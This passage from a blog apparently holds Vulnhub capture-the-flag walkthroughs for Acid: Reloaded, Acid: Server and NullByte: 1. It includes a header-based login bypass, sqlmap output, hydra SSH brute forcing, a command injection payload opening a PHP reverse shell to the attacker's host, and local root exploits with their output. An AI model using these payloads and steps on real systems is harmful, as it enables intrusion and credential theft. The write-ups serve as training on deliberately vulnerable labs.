</span></code></pre></td></tr></table></div></figure>


<p>Then using dirbuster to brute force hidden files and paths and found the page <code>/bin/dashboard.php</code></p>

<p>After a lot of failed tests, I finally found that HTTP header trick to bypass the login by adding the header <code>Referere: http://10.1.1.139:33447/bin/includes/validation.php</code>, Burp proxy help me to get next step.</p>

<p>Then I reach here <code>http://10.1.1.139:33447/bin/l33t_haxor.php</code>, by checking the source code I found the following URL <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code> and the parameter <code>id</code> is SQL injectable.</p>

<p>Using SQLMAP to exploit the SQL injection vulnerability and found the current database and tables:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>available databases [4]:                                                                                                                                                           
</span><span class='line'>[*] information_schema
</span><span class='line'>[*] mysql
</span><span class='line'>[*] performance_schema
</span><span class='line'>[*] secure_login
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>Database: secure_login                                                                                                                                                             
</span><span class='line'>[4 tables]
</span><span class='line'>+-----------------+
</span><span class='line'>| UB3R/strcpy.exe |
</span><span class='line'>| login_attempts  |
</span><span class='line'>| members         |
</span><span class='line'>| word            |
</span><span class='line'>+-----------------+
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>from the SQL injection exploit, I found <code>UB3R/strcpy.exe</code> which is interesting. Then I downloaded the binary file from <code>http://10.1.1.139:33447/UB3R/strcpy.exe</code>. By checking the file, I found there are some other files hidden in <code>strcpy.exe</code>, so I use <code>foremost</code> to recover them</p>

<p>keep the same steps as above until we found the file <code>Avinash.contact</code> which is a XML file and there is a string is base64 encoded. Then I decoded it and got <code>NooB@123</code></p>

<p>Then I created a dictionary file based on the names/keywords in file <code>Avinash.contact</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# cat dict.txt 
</span><span class='line'>Avinash
</span><span class='line'>avinash
</span><span class='line'>Makke
</span><span class='line'>makke
</span><span class='line'>acid
</span><span class='line'>acid.exploit
</span><span class='line'>acid.exploit@gmail.com
</span><span class='line'>NooB@123</span></code></pre></td></tr></table></div></figure>


<p>Then I use hydra with the file dict.txt to brute force SSH login, and found <code>makke/NooB@123</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# hydra -L dict.txt -P dict.txt 10.1.1.139 ssh -s 22
</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-09-11 08:49:26
</span><span class='line'>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 64 login tries (l:8/p:8), ~0 tries per task
</span><span class='line'>[DATA] attacking service ssh on port 22
</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
</span><span class='line'>1 of 1 target successfully completed, 2 valid passwords found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-09-11 08:49:46</span></code></pre></td></tr></table></div></figure>


<p>Login to the SSH with makke&rsquo;s login</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# ssh makke@10.1.1.139 
</span><span class='line'>    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
</span><span class='line'>   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
</span><span class='line'>  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
</span><span class='line'> / ___ \ |___ | || |_| |_____|  _ &lt;| |___| |__| |_| / ___ \| |_| | |___| |_| |
</span><span class='line'>/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
</span><span class='line'>
</span><span class='line'>                                  -by Acid
</span><span class='line'>
</span><span class='line'>Wanna Knock me out ??? 
</span><span class='line'>3.2.1 Let's Start the Game.
</span><span class='line'>                                                                              
</span><span class='line'>makke@10.1.1.139's password: 
</span><span class='line'>Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>134 packages can be updated.
</span><span class='line'>80 updates are security updates.
</span><span class='line'>
</span><span class='line'>Last login: Thu Sep 10 17:10:50 2015 from 10.1.1.130
</span><span class='line'>makke@acid:~$ id
</span><span class='line'>uid=1001(makke) gid=1001(makke) groups=1001(makke)
</span><span class='line'>makke@acid:~$ ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 00:0c:29:bb:6e:b3  
</span><span class='line'>          inet addr:10.1.1.139  Bcast:10.1.1.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::20c:29ff:febb:6eb3/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:312455 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:319819 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000 
</span><span class='line'>          RX bytes:53077085 (53.0 MB)  TX bytes:41973680 (41.9 MB)
</span><span class='line'>          Interrupt:19 Base address:0x2000 
</span><span class='line'>
</span><span class='line'>lo        Link encap:Local Loopback  
</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span><span class='line'>          RX packets:3026 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:3026 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0 
</span><span class='line'>          RX bytes:301825 (301.8 KB)  TX bytes:301825 (301.8 KB)
</span><span class='line'>
</span><span class='line'>makke@acid:~$</span></code></pre></td></tr></table></div></figure>


<p>Poking around and found clues in file <code>.bash_history</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -ah
</span><span class='line'>.  ..  .bash_history  .bash_logout  .bashrc  .cache  .hint  .profile
</span><span class='line'>makke@acid:~$ ls -ahl
</span><span class='line'>total 32K
</span><span class='line'>drwxr-xr-x 3 makke makke 4.0K Aug 24 21:28 .
</span><span class='line'>drwxr-xr-x 4 root  root  4.0K Aug 24 19:11 ..
</span><span class='line'>-rw------- 1 makke makke  272 Sep 10 17:13 .bash_history
</span><span class='line'>-rw-r--r-- 1 makke makke  220 Aug 24 19:11 .bash_logout
</span><span class='line'>-rw-r--r-- 1 makke makke 3.7K Aug 24 19:11 .bashrc
</span><span class='line'>drwx------ 2 makke makke 4.0K Aug 24 21:25 .cache
</span><span class='line'>-rw-rw-r-- 1 makke makke   40 Aug 24 21:28 .hint
</span><span class='line'>-rw-r--r-- 1 makke makke  675 Aug 24 19:11 .profile
</span><span class='line'>makke@acid:~$ cat .bash_history
</span><span class='line'>exit
</span><span class='line'>cd ..
</span><span class='line'>clear
</span><span class='line'>cd /
</span><span class='line'>ls
</span><span class='line'>cd bin/
</span><span class='line'>clear
</span><span class='line'>./overlayfs 
</span><span class='line'>clear
</span><span class='line'>cd /home/makke/
</span><span class='line'>clear
</span><span class='line'>nano .hint
</span><span class='line'>clear
</span><span class='line'>ls
</span><span class='line'>clear
</span><span class='line'>ls
</span><span class='line'>ls -a
</span><span class='line'>cat .hint 
</span><span class='line'>clear
</span><span class='line'>cd /bin/
</span><span class='line'>ls
</span><span class='line'>./overlayfs 
</span><span class='line'>clear
</span><span class='line'>wgt
</span><span class='line'>wget
</span><span class='line'>apt-get remove wget
</span><span class='line'>su
</span><span class='line'>su -
</span><span class='line'>exit
</span><span class='line'>id
</span><span class='line'>pwd
</span><span class='line'>ls
</span><span class='line'>ls -l
</span><span class='line'>pwd
</span><span class='line'>ls -alh
</span><span class='line'>cat .bash_history
</span><span class='line'>/bin/overlayfs 
</span><span class='line'>exit
</span><span class='line'>makke@acid:~$ cat .bash_history</span></code></pre></td></tr></table></div></figure>


<p>From the output above, there is an executable file <code>/bin/overlayfs</code> which is overlayfs local root exploit file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -al /bin/overlayfs 
</span><span class='line'>-rwxr-xr-x 1 root root 12236 Aug 24 21:22 /bin/overlayfs</span></code></pre></td></tr></table></div></figure>


<p>run it and ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ /bin/overlayfs 
</span><span class='line'>spawning threads
</span><span class='line'>mount #1
</span><span class='line'>mount #2
</span><span class='line'>child threads done
</span><span class='line'>/etc/ld.so.preload created
</span><span class='line'>creating shared library
</span><span class='line'># id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1001(makke)
</span><span class='line'># cd root
</span><span class='line'>sh: 2: cd: can't cd to root
</span><span class='line'># cd /root
</span><span class='line'># ls -al
</span><span class='line'>total 68
</span><span class='line'>drwx------  5 root root  4096 Aug 24 21:32 .
</span><span class='line'>drwxr-xr-x 22 root root  4096 Aug 24 20:58 ..
</span><span class='line'>-rw-------  1 root root 23934 Aug 24 22:25 .bash_history
</span><span class='line'>-rw-r--r--  1 root root  3135 Aug  8 18:02 .bashrc
</span><span class='line'>drwx------  2 root root  4096 Aug 24 17:46 .cache
</span><span class='line'>drwx------  3 root root  4096 Aug  6 17:55 .config
</span><span class='line'>drwx------  3 root root  4096 Aug  6 15:51 .dbus
</span><span class='line'>-rw-r--r--  1 root root   284 Aug 24 20:57 .flag.txt
</span><span class='line'>-rw-------  1 root root  2775 Aug 24 21:32 .mysql_history
</span><span class='line'>-rw-------  1 root root   147 Aug 24 23:32 .nano_history
</span><span class='line'>-rw-r--r--  1 root root   140 Feb 20  2014 .profile
</span><span class='line'>-rw-r--r--  1 root root    66 Aug  6 17:31 .selected_editor
</span><span class='line'># cat .flag.txt
</span><span class='line'>Dear Hax0r,
</span><span class='line'>
</span><span class='line'>You have completed the Challenge Successfully.
</span><span class='line'>
</span><span class='line'>Your Flag is : "Black@Current@Ice-Cream"
</span><span class='line'>
</span><span class='line'>Kind & Best Regards
</span><span class='line'>
</span><span class='line'>-ACiD
</span><span class='line'>
</span><span class='line'>Twitter:https://twitter.com/m_avinash143
</span><span class='line'>Facebook: https://www.facebook.com/M.avinash143
</span><span class='line'>LinkedIN: https://in.linkedin.com/pub/avinash-thapa/101/406/4b5
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>


<p>Done!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Acid: Server]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server/"/>
    <updated>2015-09-03T19:36:37+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server</id>
    <content type="html"><![CDATA[<p><strong>Acid:Server</strong> is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-server,125/">here</a>.</p>

<!-- more -->


<h2>Links</h2>

<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/138178348?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Acid: Server (<em>10.1.1.132/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Hints stored in some pages' source code or title, otherwise dirbuster/wfuzz can be used to find hidden folders</li>
<li>Command injection vulnerability exists in <code>/Challenge/Magic_Box/command.php</code>, exploit it can obtain a reverse shell</li>
<li>Apport/Ubuntu - Local Root Race Condition exploit (CVE-2015-1325) exist, exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found the hidden folder and a page which has command injection vulnerability, analyse it with burp suite and exploit it to get a reverse shell</li>
<li>Enumeration and found the server is vulnerable to CVE-2015-1325, exploit it to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.132 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.132    00:0c:29:36:7b:18   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:fb:ea:26   VMware, Inc.</span></code></pre></td></tr></table></div></figure>


<p>10.1.1.132 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -H -msf -p 1-65535 -Iv -T4 10.1.1.132
</span><span class='line'>adding 10.1.1.132/32 mode `TCPscan' ports `1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:14028 -> 10.1.1.132:33447
</span><span class='line'>TCP open 10.1.1.132:33447  ttl 64
</span><span class='line'>sender statistics 291.2 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131074 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open           unknown[33447]     from 10.1.1.132  ttl 64</span></code></pre></td></tr></table></div></figure>


<p>From the result above, TCP port 33447 has been discovered.</p>

<p>Then I run NMAP scan to probe more detail information against the opening port.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Host is up (0.00029s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>|_http-methods: GET HEAD POST OPTIONS
</span><span class='line'>|_http-server-header: Apache/2.4.10 (Ubuntu)
</span><span class='line'>|_http-title: /Challenge
</span><span class='line'>MAC Address: 00:0C:29:36:7B:18 (VMware)</span></code></pre></td></tr></table></div></figure>


<p>I found that apache 2.4.10 is running on port 33447, and the server OS is Ubuntu Linux.</p>

<p>Then I start up the firefox to have a close look the web application and found hidden path from title or dirbuster scan or decode the password on the bottom of source code.</p>

<p>The hidden folder is <code>/Challenge</code></p>

<p>Then I keep using <code>dirbuster</code> to <code>/Challenge/</code> folder and found some pages, one of them is <code>cake.php</code> which again, the title give us the clue to another hidden folder <code>/Magic_Box</code></p>

<p>Keep running <code>dirbuster</code> to <code>/Challenge/Magic_Box</code> folder and found interesting php page <code>command.php</code> which has command injection vulnerability</p>

<p>Then by using <code>burp proxy</code> and tamper the request to exploit command injection vulnerability to get a shell, due to there is no <code>wget</code> in the target server, I use the following php command:</p>

<p>payload (the payload need to be <font color="red">URL encoded</font>):</p>

<p><code>127.0.0.1; php -r '$sock=fsockopen("10.1.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>

<p>Setting up <code>NC</code> to listen on port 4444, then send the payload to server and got a reverse shell with <code>www-data</code> limited privilege.</p>

<p>Then running some enumeration and poking around, I found the target server is Ubuntu 15.04, which is local privilege escape vulnerable to <code>CVE-2015-1325</code></p>

<p>Compile and send the exploit to target server, then run it to get ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@acid:/tmp$ ./37088
</span><span class='line'>./37088
</span><span class='line'>created /var/crash/_bin_sleep.33.crash
</span><span class='line'>crasher: my pid is 2571
</span><span class='line'>apport stopped, pid = 2572
</span><span class='line'>getting pid 2571
</span><span class='line'>current pid = 2570..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..2500..
</span><span class='line'>** child: current pid = 2571
</span><span class='line'>** child: executing /bin/su
</span><span class='line'>Password: sleeping 2s..
</span><span class='line'>
</span><span class='line'>checker: mode 4516
</span><span class='line'>waiting for file to be unlinked..writing to fifo
</span><span class='line'>fifo written.. wait...
</span><span class='line'>waiting for /etc/sudoers.d/core to appear..
</span><span class='line'>success
</span><span class='line'># id
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'># python -c 'import pty; pty.spawn("/bin/bash")'
</span><span class='line'>python -c 'import pty; pty.spawn("/bin/bash")'
</span><span class='line'>  ____                            _         _       _   _                 
</span><span class='line'> / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
</span><span class='line'>| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
</span><span class='line'>| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
</span><span class='line'> \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
</span><span class='line'>                  |___/                                                   
</span><span class='line'>root@acid:/tmp# cd /root
</span><span class='line'>cd /root
</span><span class='line'>root@acid:~# ls
</span><span class='line'>ls
</span><span class='line'>flag.txt
</span><span class='line'>root@acid:~# cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Dear Hax0r,
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>You have successfully completed the challenge.
</span><span class='line'>
</span><span class='line'>I  hope you like it.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>FLAG NAME: "Acid@Makke@Hax0r"
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Kind & Best Regards
</span><span class='line'>
</span><span class='line'>-ACID
</span><span class='line'>facebook: https://facebook.com/m.avinash143
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>root@acid:~#</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]NullByte: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1/"/>
    <updated>2015-08-18T23:12:46+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1</id>
    <content type="html"><![CDATA[<p><strong>NullByte challenge 0x01</strong></p>

<p>Difficulty is Basic to intermediate.</p>

<p>&ldquo;Use your lateral thinking skills, maybe you’ll need to write some code.&rdquo; &ndash; <a href="http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/">ly0n</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">here</a>.</p>

<!-- more -->


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/nullbyte1/main.png"></p>

<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.130/24</em>)</p>

<p>Target: NullByte: 1 (<em>10.10.10.134/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Found hidden information in picture and open the hidden path</li>
<li>Weak passwords used in Web login form, the password can be found by brute-force attacking</li>
<li>SQL injection vulnerability found in username searching page</li>
<li>Exploit SQL injection vulnerability to get user credentials, also can get a limited shell</li>
<li>Found user ramses with Base64 encoded MD5 password which can be cracked easily and SSH login as ramses</li>
<li>Mis-configuration program which has setuid set and did not use full path inside of system call. Exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirb</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Download picture from index.html and reveal the hidden information stored in it</li>
<li>Found the hidden folder and a login page which has comment saying that the password is simple</li>
<li>Use hydra with rockyou.txt to burte force crack the login password [<font color="FF8000">THC Hydra</font>]</li>
<li>The next username searching page is SQL injection vulnerable, exploit it to downlaod system sensitive file, login credentials and also get a limited shell [<font color="FF8000">sqlmap</font>]</li>
<li>Crack user ramses&rsquo;s password and ssh login to get a better shell</li>
<li>System enumeration and Exploit vulnerable program with setuid bit set to get ROOT</li>
</ul>


<h2>Tools</h2>

